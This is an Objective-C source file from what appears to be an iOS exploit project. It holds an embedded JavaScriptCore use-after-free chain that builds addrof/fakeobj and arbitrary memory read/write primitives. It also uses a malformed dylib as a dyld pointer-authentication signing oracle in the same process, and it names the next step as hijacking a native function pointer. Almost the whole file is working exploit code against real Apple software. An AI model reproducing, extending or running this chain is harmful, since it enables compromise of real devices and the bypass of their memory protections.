#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <JavaScriptCore/JavaScriptCore.h>
#import <dlfcn.h>
#import <mach-o/dyld.h>
#import <mach-o/loader.h>
#import <string.h>
#import <stdio.h>
#import "Modules.h"
#import "Root.h"
#import "Util.h"
#import "AppDelegate.h"

// ===========================================================================
// One process, both primitives.
// The JSC UAF chain (addrof/fakeobj -> read64/write64) runs inside a `JSContext`
// that WE own -- pure JS, no DOM -- and the dyld PAC signing oracle's dlopen
// happens in the SAME native process.  That is the join the public analysis
// calls for: with both inside one address space, the PAC-valid pointer that
// dyld writes can be spent by the JSC primitive (NativeExecutable::m_function
// or a zero-context blraaz gadget) instead of only being observed.
// ===========================================================================
static const char *kUnifiedJS = R"JS(
(function () {
  var out = { step: [] };
  var ab = new ArrayBuffer(8), u = new BigUint64Array(ab), d = new Float64Array(ab);
  var itof = function (v) { u[0] = v; return d[0]; };
  var ftoi = function (f) { d[0] = f; return u[0]; };
  var OFF = 0x0002000000000000n;
  var HDR = 0x07n | (0x2Bn << 40n) | (1n << 56n);
  var BUDGET = 150000, t0 = Date.now(), rounds = 0;

  arr = new Array(0x400000).fill(1.1);
  var arr_index = arr.length - 1;
  function foo(flag, k, allocCount) {
    let A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
    arr[arr_index] = A; let forGC = [];
    let a = new Date(1111); a[0] = 1.1;
    for (let j = 0; j < allocCount; ++j) forGC.push(new ArrayBuffer(0x800000));
    A.p2 = forGC;
    let b = { p0: 0x42424242, p1: 1.1 };
    let f; f = b; if (flag) { f = 1.1; }
    A.p1 = f; let v = 1.1;
    for (let i = 0; i < 1e6; ++i) { for (let j = 0; j < k; ++j) { v = i; v = j; } }
    b.p0 = v; b.p1 = a;
  }
  function rec(n) { if (n === 0) return; n = n | 0; rec(n - 1); }
  foo(true, 1, 1); foo(false, 1, 1);
  for (let i = 0; i < 1000; ++i) foo(false, 0, 0);
  for (let i = 0; i < 10000; i++) rec(i);

  var W = null;
  for (let k = 0; k < 10000 && !W; ++k) {
    rounds = k + 1;
    // OSR cost: full inner loops while foo/rec tier up, then a much cheaper
    // variant -- the original per-round cost (~60M JS calls) meant the module
    // could never reach a verdict inside a single app run.
    var kk = (k < 30) ? 10 : 2;
    foo(false, kk, k % 5 + 1); rec(2000);
    for (let i = 0; i < 3; ++i) new ArrayBuffer(0x4000);
    let fr = arr[arr_index].p1.p1;
    let noCow = 13.37;
    for (let i = 0; i < 16; ++i) {
      let c = [13.37, 2.2, 3.3, 4.4, noCow];
      if (fr[0] === 13.37) { W = { freed: fr, boxed: c, round: k }; break; }
    }
    if (k % 25 === 24) aveStep('hunt round=' + rounds +
                              ' elapsed=' + (Date.now() - t0) + 'ms trigger=no');
    if (Date.now() - t0 > BUDGET) break;
  }
  out.rounds = rounds; out.huntMs = Date.now() - t0;
  aveStep('hunt finished: rounds=' + rounds + ' in ' + out.huntMs + 'ms');
  if (!W) { out.err = 'trigger did not fire'; return JSON.stringify(out); }
  out.step.push('UAF round=' + W.round);
  function addrof(o) { W.boxed[0] = o; return ftoi(W.freed[0]); }
  function fakeobj(a) { W.freed[0] = itof(a); return W.boxed[0]; }

  var holder   = { p1: 2.2, p2: 2.2, p3: 2.2, p4: 2.2, p5: 2.2, p6: 2.2 };
  var scribble = { p1: 2.2, p2: 2.2, p3: 2.2, p4: 2.2, p5: 2.2, p6: 2.2 };
  var HA = addrof(holder), SA = addrof(scribble), gap = SA - HA;
  for (var t = 0; t < 40 && gap !== 0x40n && gap !== -0x40n; t++) {
    holder   = { p1: 2.2, p2: 2.2, p3: 2.2, p4: 2.2, p5: 2.2, p6: 2.2 };
    scribble = { p1: 2.2, p2: 2.2, p3: 2.2, p4: 2.2, p5: 2.2, p6: 2.2 };
    HA = addrof(holder); SA = addrof(scribble); gap = SA - HA;
  }
  out.gap = gap.toString();
  if (gap !== 0x40n && gap !== -0x40n) { out.err = 'groom failed'; return JSON.stringify(out); }
  out.step.push('groom ok, gap=' + gap);

  scribble.p7 = 3.3; scribble[0] = 1.1;
  holder.p1 = itof(HDR);
  holder.p2 = scribble;
  var changeArr = fakeobj(HA - 1n + 0x10n + 1n);
  function setBtf(a) { changeArr[1] = itof(BigInt(a) + 0x10n); }
  function write64(addr, val) {
    setBtf(BigInt(addr));
    try { scribble.p7 = itof(BigInt.asUintN(64, BigInt(val))); return true; } catch (e) { return false; }
  }
  function read64(addr) {
    setBtf(BigInt(addr));
    try { return BigInt(ftoi(changeArr[0])); } catch (e) { return null; }
  }

  // ---- self-test -------------------------------------------------------
  var t = new BigUint64Array(8);
  t[0] = 0x4142434445464748n;
  var w1 = write64(addrof(t) - 1n + 0x18n, 0x0000000000001000n);
  out.write = (w1 && t.length === 4096);
  out.read = (t[0] === 0x4142434445464748n);
  out.step.push('self-test: write=' + out.write + ' read=' + out.read);

  // ---- infoleaks the next step needs ----------------------------------
  // JSC base: the first field of a JSFunction cell is its ExecutableBase ptr.
  var fn = function myFunc() { return 1; };
  out.fnAddr = '0x' + addrof(fn).toString(16);
  var w0 = read64(addrof(fn) - 1n);
  out.fnWord = w0 === null ? null : '0x' + w0.toString(16);
  out.step.push('JSFunction header word=' + out.fnWord);
  out.ready = out.write && out.read;
  return JSON.stringify(out);
})()
)JS";

NSString *ModUnifiedPrimitives(void) {
    AveLog(@"    unified: JSC UAF inside OUR JSContext, then the dyld oracle in the SAME process");

    // 1. JSC chain in this process's own JavaScriptCore
    JSContext *ctx = [[JSContext alloc] init];
    NSString *res = @"(no answer)";
    ctx[@"aveStep"] = ^(id s) {
        NSString *line = [s isKindOfClass:[NSString class]] ? s : [s description] ?: @"?";
        AveLog([NSString stringWithFormat:@"    js. %@", line]);
        AvePost([NSString stringWithFormat:@"UNIFIED STEP %@", line]);
    };
    [ctx evaluateScript:@"1+1"];
    @try {
        JSValue *v = [ctx evaluateScript:[NSString stringWithUTF8String:kUnifiedJS]];
        if ([ctx exception]) res = [[ctx exception] toString] ?: @"js exception";
        else res = [v isKindOfClass:[NSString class]] ? v
                : ([v respondsToSelector:@selector(description)] ? [v description] : @"?");
    } @catch (NSException *e) {
        res = [NSString stringWithFormat:@"exception %@", e.reason];
    }
    AveLog([NSString stringWithFormat:@"    JSC chain: %@", res]);
    BOOL jscReady = [res containsString:@"\"ready\":true"];
    AvePost([NSString stringWithFormat:@"JSC %@", res]);

    // 2. the dyld signing oracle in the SAME process
    NSString *bundle = [NSBundle mainBundle].bundlePath;
    NSString *mal = [bundle stringByAppendingPathComponent:@"Frameworks/libmalformed.dylib"];
    NSString *ex  = [bundle stringByAppendingPathComponent:@"libexports.dylib"];
    NSString *cl  = [bundle stringByAppendingPathComponent:@"libclient.dylib"];
    BOOL oracleOk = NO;
    uint64_t wt = 0, dlsymAddr = 0;
    if ([[NSFileManager defaultManager] fileExistsAtPath:mal]) {
        dlopen(ex.UTF8String, RTLD_NOW | RTLD_GLOBAL);
        dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
            void *h_cl = dlopen(cl.UTF8String, RTLD_NOW);
            (void)h_cl;
        });
        AveSleep(600);
        void *h_mal = dlopen(mal.UTF8String, RTLD_NOW);
        if (h_mal) {
            AveLog(@"    dyld oracle: libmalformed accepted in THIS process");
            uint32_t n = _dyld_image_count();
            void *data = NULL;
            for (uint32_t i = 0; i < n; i++) {
                const char *nm = _dyld_get_image_name(i);
                if (!nm) continue;
                const char *b = strrchr(nm, '/');
                b = b ? b + 1 : nm;
                if (!strstr(b, "libmalformed.dylib")) continue;
                const struct mach_header *mh = _dyld_get_image_header(i);
                intptr_t slide = _dyld_get_image_vmaddr_slide(i);
                const uint8_t *lc = (const uint8_t *)((const struct mach_header_64 *)mh + 1);
                for (uint32_t j = 0; j < ((const struct mach_header_64 *)mh)->ncmds; j++) {
                    const struct load_command *cmd = (const struct load_command *)lc;
                    if (cmd->cmd == LC_SEGMENT_64) {
                        const struct segment_command_64 *seg = (const struct segment_command_64 *)lc;
                        if (!strncmp(seg->segname, "__DATA", 6)) {
                            data = (void *)(seg->vmaddr + slide);
                            break;
                        }
                    }
                    lc += cmd->cmdsize;
                }
            }
            if (data) {
                uint64_t *slots = (uint64_t *)data;
                wt = slots[2];
                bool canaries = (slots[0] == 0xAAAAAAAAAAAAAAAAULL) &&
                                (slots[3] == 0xBBBBBBBBBBBBBBBBULL);
                void *sym = dlsym(RTLD_DEFAULT, "write_target_value");
                dlsymAddr = (uint64_t)sym;
                oracleOk = (wt != 0xDEADDEADDEADDEADULL) && ((wt >> 63) == 0) && canaries;
                AveLog(S(@"    dyld oracle: slot=%#llx dlsym=%p canaries=%d bit63=%d",
                         (unsigned long long)wt, sym, canaries ? 1 : 0, (int)((wt >> 63) & 1)));
            }
        } else {
            AveLog(S(@"    dyld oracle: libmalformed REJECTED: %s", dlerror()));
        }
    }

    ctx = nil;
    if (jscReady && oracleOk) {
        AveSetStatus(@"BOTH PRIMITIVES IN ONE PROCESS");
        return S(@"unified: JSC R/W + dyld PAC oracle live in one process "
                 @"(slot=%#llx dlsym=%#llx) -> NativeExecutable->m_function is the next call",
                 (unsigned long long)wt, (unsigned long long)dlsymAddr);
    }
    if (jscReady) return @"JSC R/W live in-process; dyld oracle not confirmed this run";
    if (oracleOk) return @"dyld oracle live in-process; JSC R/W not reached this run";
    return @"unified run: neither primitive confirmed";
}
